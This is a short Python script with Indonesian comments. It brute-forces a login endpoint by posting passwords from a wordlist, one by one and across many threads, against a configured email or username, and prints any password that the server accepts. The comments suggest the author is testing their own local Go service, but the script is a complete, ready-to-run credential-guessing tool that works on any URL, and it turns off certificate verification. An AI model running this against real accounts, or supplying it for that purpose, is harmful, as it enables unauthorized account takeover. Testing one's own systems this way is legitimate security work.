import os
import time
from concurrent.futures import ThreadPoolExecutor

import httpx
from dotenv import load_dotenv

load_dotenv()

BASE_URL = os.getenv("BASE_URL", "").rstrip("/")
URL = os.getenv("TARGET_URL", "")
AUTH_MODE = os.getenv("AUTH_MODE", "email").strip().lower()
TARGET_EMAIL = os.getenv("TARGET_EMAIL")
TARGET_USERNAME = os.getenv("TARGET_USERNAME")
PASSWORD_FILE = os.getenv("PASSWORD_FILE", "pass.txt")
THREADS = int(os.getenv("THREADS", 5))
SUCCESS_INDICATOR = os.getenv("SUCCESS_INDICATOR", "success")

if not URL:
    if not BASE_URL:
        raise SystemExit("BASE_URL atau TARGET_URL wajib diisi")

    if AUTH_MODE == "email":
        URL = f"{BASE_URL}"
    elif AUTH_MODE == "username":
        URL = f"{BASE_URL}"
    else:
        raise SystemExit("AUTH_MODE harus 'email' atau 'username'")


def attempt_login(password):
    password = password.strip()
    # Payload dalam bentuk dictionary untuk dikirim sebagai JSON
    payload = {"password": password}

    if AUTH_MODE == "email":
        if not TARGET_EMAIL:
            print("TARGET_EMAIL belum diisi")
            return False
        payload["email"] = TARGET_EMAIL
    elif AUTH_MODE == "username":
        if not TARGET_USERNAME:
            print("TARGET_USERNAME belum diisi")
            return False
        payload["username"] = TARGET_USERNAME
    else:
        print("AUTH_MODE harus 'email' atau 'username'")
        return False

    start = time.time()
    try:
        # PENTING: Menggunakan json=payload agar Go bisa nge-decode struct-nya
        # verify=False ditambahkan jika kamu pakai self-signed certificate di local
        response = httpx.post(URL, json=payload, timeout=10.0, verify=False)
        duration = time.time() - start

        # Kita cek status code 200 dan apakah ada kata kunci sukses di body
        if response.status_code == 200 and SUCCESS_INDICATOR in response.text.lower():
            print(f"got it with, Password: {password} ({duration:.2f}s)")
            return True
        else:
            print(
                f"Nope: {password} | Status: {response.status_code} ({duration:.2f}s)"
            )
            return False
    except Exception as e:
        print(f"Error pada {password}: {e}")
        return False


def run_sim():
    try:
        with open(PASSWORD_FILE, "r") as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print(f"File {PASSWORD_FILE} tidak ketemu!")
        return

    print(f"Simulate {URL}")
    print(f"{THREADS} threads... Siapkan 'htop' untuk cek CPU!\n")

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        results = list(executor.map(attempt_login, passwords))

        if any(results):
            print("\nDone.")
        else:
            print("\nNone.")


if __name__ == "__main__":
    run_sim()
